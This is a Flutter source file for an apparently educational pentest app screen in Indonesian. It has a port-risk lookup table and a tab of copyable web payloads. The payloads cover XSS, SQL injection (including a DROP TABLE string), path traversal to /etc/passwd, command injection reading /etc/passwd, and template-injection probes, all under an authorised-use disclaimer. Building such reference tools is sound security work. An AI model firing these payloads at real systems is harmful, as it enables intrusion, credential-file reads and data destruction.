import 'dart:ui';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:pixelarticons/pixelarticons.dart';

class NetworkScannerScreen extends StatefulWidget {
  const NetworkScannerScreen({super.key});

  @override
  State<NetworkScannerScreen> createState() => _NetworkScannerScreenState();
}

class _NetworkScannerScreenState extends State<NetworkScannerScreen>
    with SingleTickerProviderStateMixin {
  late final TabController _tab;
  final _portCtrl = TextEditingController();
  final _payloadCtrl = TextEditingController();
  String _portResult = '';
  String _payloadResult = '';
  String? _portError;

  @override
  void initState() {
    super.initState();
    _tab = TabController(length: 3, vsync: this);
  }

  @override
  void dispose() {
    _tab.dispose();
    _portCtrl.dispose();
    _payloadCtrl.dispose();
    super.dispose();
  }

  static const _portDb = <int, (String, String, String)>{
    21: ('FTP', 'File Transfer Protocol', 'High'),
    22: ('SSH', 'Secure Shell', 'Low'),
    23: ('Telnet', 'Unencrypted terminal', 'Critical'),
    25: ('SMTP', 'Simple Mail Transfer Protocol', 'Medium'),
    53: ('DNS', 'Domain Name System', 'Medium'),
    80: ('HTTP', 'Hypertext Transfer Protocol (unencrypted)', 'Medium'),
    110: ('POP3', 'Post Office Protocol v3', 'Medium'),
    143: ('IMAP', 'Internet Message Access Protocol', 'Medium'),
    443: ('HTTPS', 'HTTP over TLS/SSL', 'Low'),
    445: ('SMB', 'Server Message Block (common ransomware vector)', 'Critical'),
    1433: ('MSSQL', 'Microsoft SQL Server', 'High'),
    1521: ('Oracle DB', 'Oracle Database Listener', 'High'),
    2375: (
      'Docker',
      'Docker daemon (unencrypted — critical exposure)',
      'Critical',
    ),
    3000: ('Dev Server', 'Common development server port', 'Medium'),
    3306: ('MySQL', 'MySQL Database', 'High'),
    3389: ('RDP', 'Remote Desktop Protocol', 'Critical'),
    4443: ('Alt HTTPS', 'Alternative HTTPS port', 'Low'),
    5432: ('PostgreSQL', 'PostgreSQL Database', 'High'),
    5900: ('VNC', 'Virtual Network Computing', 'Critical'),
    6379: ('Redis', 'Redis (no auth by default)', 'Critical'),
    8080: ('HTTP Alt', 'Alternative HTTP / proxy port', 'Medium'),
    8443: ('HTTPS Alt', 'Alternative HTTPS port', 'Low'),
    8888: ('Jupyter', 'Jupyter Notebook (often no auth)', 'Critical'),
    9200: (
      'Elasticsearch',
      'Elasticsearch REST API (no auth default)',
      'Critical',
    ),
    27017: (
      'MongoDB',
      'MongoDB (no auth by default in older versions)',
      'Critical',
    ),
  };

  static const _riskColor = {
    'Low': Color(0xFF6AAB6E),
    'Medium': Color(0xFFD2933A),
    'High': Color(0xFFE07B50),
    'Critical': Color(0xFFD25757),
  };

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        backgroundColor: Theme.of(context).colorScheme.surface
            .withValues(alpha: .65),
        elevation: 0,
        scrolledUnderElevation: 0,
        flexibleSpace: ClipRect(
          child: BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 12, sigmaY: 12),
            child: Container(color: Colors.transparent),
          ),
        ),
        leading: IconButton(
          onPressed: () => Navigator.pop(context),
          icon: const Icon(Pixel.chevronleft),
        ),
        title: const Text('Network & Web Scanner'),
        bottom: TabBar(
          controller: _tab,
          tabs: const [
            Tab(text: 'Port Lookup'),
            Tab(text: 'Port Reference'),
            Tab(text: 'Payloads'),
          ],
        ),
      ),
      body: TabBarView(
        controller: _tab,
        children: [_portLookupTab(), _portReferenceTab(), _payloadsTab()],
      ),
    );
  }

  Widget _portLookupTab() {
    return ListView(
      padding: const EdgeInsets.all(20),
      children: [
        _infoBox(
          'Cari informasi port berdasarkan nomor port. Data lokal — tidak memerlukan koneksi.',
          Pixel.radiotower,
        ),
        const SizedBox(height: 16),
        TextField(
          controller: _portCtrl,
          keyboardType: TextInputType.number,
          decoration: const InputDecoration(
            labelText: 'Nomor Port',
            hintText: 'contoh: 22, 443, 3306',
          ),
        ),
        const SizedBox(height: 12),
        Row(
          children: [
            Expanded(
              child: FilledButton.icon(
                onPressed: _lookupPort,
                icon: const Icon(Pixel.play),
                label: const Text('Cari'),
              ),
            ),
            const SizedBox(width: 10),
            OutlinedButton.icon(
              onPressed: () => setState(() {
                _portCtrl.clear();
                _portResult = '';
                _portError = null;
              }),
              icon: const Icon(Pixel.trash),
              label: const Text('Hapus'),
            ),
          ],
        ),
        if (_portError != null) ...[
          const SizedBox(height: 12),
          _errorBox(_portError!),
        ],
        if (_portResult.isNotEmpty) ...[
          const SizedBox(height: 16),
          _resultCard(_portResult),
        ],
      ],
    );
  }

  void _lookupPort() {
    final raw = _portCtrl.text.trim();
    final port = int.tryParse(raw);
    if (port == null || port < 1 || port > 65535) {
      setState(() => _portError = 'Masukkan nomor port yang valid (1–65535).');
      return;
    }
    final info = _portDb[port];
    final sb = StringBuffer();
    sb.writeln('Port         : $port');
    if (info != null) {
      sb.writeln('Service      : ${info.$1}');
      sb.writeln('Description  : ${info.$2}');
      sb.writeln('Risk Level   : ${info.$3}');
      sb.writeln('');
      if (info.$3 == 'Critical') {
        sb.writeln(
          '⚠️  Port ini memiliki risiko tinggi jika terbuka ke internet.',
        );
        sb.writeln(
          '   Segera verifikasi apakah port ini harus bisa diakses publik.',
        );
      } else if (info.$3 == 'High') {
        sb.writeln(
          '⚠️  Pastikan service di port ini dikonfigurasi dengan aman.',
        );
      }
    } else {
      final category = port < 1024
          ? 'Well-known port (sistem/layanan umum)'
          : port < 49152
          ? 'Registered port (aplikasi pihak ketiga)'
          : 'Dynamic/private port (ephemeral)';
      sb.writeln('Service      : (tidak ada di database)');
      sb.writeln('Category     : $category');
    }

    setState(() {
      _portError = null;
      _portResult = sb.toString().trim();
    });
  }

  Widget _portReferenceTab() {
    final entries = _portDb.entries.toList()
      ..sort((a, b) => a.key.compareTo(b.key));
    return ListView(
      padding: const EdgeInsets.all(20),
      children: [
        _infoBox(
          'Daftar port umum yang sering ditemukan dalam pentest beserta tingkat risikonya.',
          Pixel.table,
        ),
        const SizedBox(height: 12),
        ...entries.map((e) {
          final color = _riskColor[e.value.$3] ?? Colors.grey;
          return Card(
            child: ListTile(
              leading: _sticker(Pixel.radiotower, color),
              title: Text(
                '${e.key} — ${e.value.$1}',
                style: const TextStyle(fontWeight: FontWeight.w700),
              ),
              subtitle: Text(e.value.$2),
              trailing: Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                decoration: BoxDecoration(
                  color: color.withOpacity(.14),
                  borderRadius: BorderRadius.circular(10),
                ),
                child: Text(
                  e.value.$3,
                  style: TextStyle(
                    fontSize: 10,
                    fontWeight: FontWeight.w700,
                    color: color,
                  ),
                ),
              ),
            ),
          );
        }),
      ],
    );
  }

  Widget _payloadsTab() {
    final categories = <String, List<(String, String)>>{
      'XSS (Cross-Site Scripting)': [
        ('<script>alert(1)</script>', 'Basic script tag'),
        ('<img src=x onerror=alert(1)>', 'Img onerror event'),
        ('"><script>alert(document.domain)</script>', 'Attribute breakout'),
        ("'; alert(1); //", 'Single quote JS injection'),
        ('<svg onload=alert(1)>', 'SVG onload event'),
        ('javascript:alert(1)', 'JavaScript URI'),
      ],
      'SQL Injection': [
        ("' OR '1'='1", 'Basic OR bypass'),
        ("' OR '1'='1' --", 'Comment terminator'),
        ("'; DROP TABLE users; --", 'Destructive injection'),
        ("' UNION SELECT null,null,null --", 'UNION select probe'),
        ("1' AND SLEEP(5) --", 'Time-based blind'),
        ("' AND 1=1 --", 'Boolean-based blind'),
      ],
      'Path Traversal': [
        ('../../../etc/passwd', 'Unix password file'),
        ('..\\..\\..\\windows\\win.ini', 'Windows INI file'),
        ('%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'URL encoded'),
        ('....//....//etc/passwd', 'Double dot bypass'),
      ],
      'Command Injection': [
        ('; ls -la', 'Unix command chaining'),
        ('| whoami', 'Unix pipe injection'),
        ('&& cat /etc/passwd', 'Unix AND chaining'),
        ('; dir', 'Windows command chain'),
        ('`id`', 'Backtick execution'),
      ],
      'SSTI (Template Injection)': [
        ('{{7*7}}', 'Jinja2/Twig probe'),
        ('\${7*7}', 'Freemarker/Thymeleaf probe'),
        ('#{7*7}', 'Ruby ERB probe'),
        ('<%= 7*7 %>', 'ERB syntax'),
      ],
    };

    return ListView(
      padding: const EdgeInsets.all(20),
      children: [
        Container(
          padding: const EdgeInsets.all(13),
          decoration: BoxDecoration(
            color: Theme.of(context).colorScheme.error.withOpacity(.08),
            borderRadius: BorderRadius.circular(14),
          ),
          child: Row(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Icon(
                Pixel.alert,
                color: Theme.of(context).colorScheme.error,
                size: 18,
              ),
              const SizedBox(width: 10),
              const Expanded(
                child: Text(
                  'DISCLAIMER: Payload ini hanya untuk tujuan edukasi dan pengujian pada sistem yang SUDAH MENDAPAT IZIN. Penggunaan tanpa izin adalah ilegal.',
                  style: TextStyle(fontSize: 12),
                ),
              ),
            ],
          ),
        ),
        const SizedBox(height: 16),
        ...categories.entries.map(
          (cat) => Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Padding(
                padding: const EdgeInsets.symmetric(vertical: 8),
                child: Text(
                  cat.key,
                  style: Theme.of(context).textTheme.titleSmall
                      ?.copyWith(fontWeight: FontWeight.w800),
                ),
              ),
              ...cat.value.map(
                (p) => Card(
                  child: ListTile(
                    dense: true,
                    title: Text(
                      p.$1,
                      style: const TextStyle(
                        fontFamily: 'monospace',
                        fontSize: 13,
                      ),
                    ),
                    subtitle: Text(p.$2),
                    trailing: IconButton(
                      icon: const Icon(Pixel.copy, size: 17),
                      tooltip: 'Salin payload',
                      onPressed: () async {
                        await Clipboard.setData(ClipboardData(text: p.$1));
                        if (mounted) {
                          ScaffoldMessenger.of(context).showSnackBar(
                            const SnackBar(content: Text('Payload disalin')),
                          );
                        }
                      },
                    ),
                  ),
                ),
              ),
              const SizedBox(height: 8),
            ],
          ),
        ),
      ],
    );
  }

  Widget _infoBox(String text, IconData icon) => Container(
    padding: const EdgeInsets.all(13),
    decoration: BoxDecoration(
      color: Theme.of(context).colorScheme.primaryContainer.withOpacity(.4),
      borderRadius: BorderRadius.circular(14),
    ),
    child: Row(
      children: [
        Icon(icon, size: 18, color: Theme.of(context).colorScheme.primary),
        const SizedBox(width: 10),
        Expanded(child: Text(text, style: const TextStyle(fontSize: 12))),
      ],
    ),
  );

  Widget _errorBox(String text) => Container(
    padding: const EdgeInsets.all(13),
    decoration: BoxDecoration(
      color: Theme.of(context).colorScheme.error.withOpacity(.09),
      borderRadius: BorderRadius.circular(14),
    ),
    child: Row(
      children: [
        Icon(Pixel.alert, color: Theme.of(context).colorScheme.error),
        const SizedBox(width: 10),
        Expanded(
          child: Text(
            text,
            style: TextStyle(color: Theme.of(context).colorScheme.error),
          ),
        ),
      ],
    ),
  );

  Widget _resultCard(String text) => Column(
    crossAxisAlignment: CrossAxisAlignment.start,
    children: [
      Row(
        children: [
          Expanded(
            child: Text(
              'Hasil',
              style: Theme.of(context).textTheme.titleMedium
                  ?.copyWith(fontWeight: FontWeight.w800),
            ),
          ),
          IconButton(
            icon: const Icon(Pixel.copy),
            onPressed: () async {
              await Clipboard.setData(ClipboardData(text: text));
              if (mounted) {
                ScaffoldMessenger.of(context).showSnackBar(
                  const SnackBar(content: Text('Disalin ke clipboard')),
                );
              }
            },
          ),
        ],
      ),
      Container(
        width: double.infinity,
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          color: Theme.of(context).colorScheme.surfaceVariant.withOpacity(.55),
          borderRadius: BorderRadius.circular(14),
        ),
        child: SelectableText(
          text,
          style: const TextStyle(fontFamily: 'monospace', height: 1.5),
        ),
      ),
    ],
  );

  Widget _sticker(IconData icon, Color color) => Container(
    width: 38,
    height: 38,
    alignment: Alignment.center,
    decoration: BoxDecoration(
      color: color.withOpacity(.12),
      borderRadius: BorderRadius.circular(10),
      border: Border.all(color: color.withOpacity(.35)),
    ),
    child: Icon(icon, size: 20, color: color),
  );
}
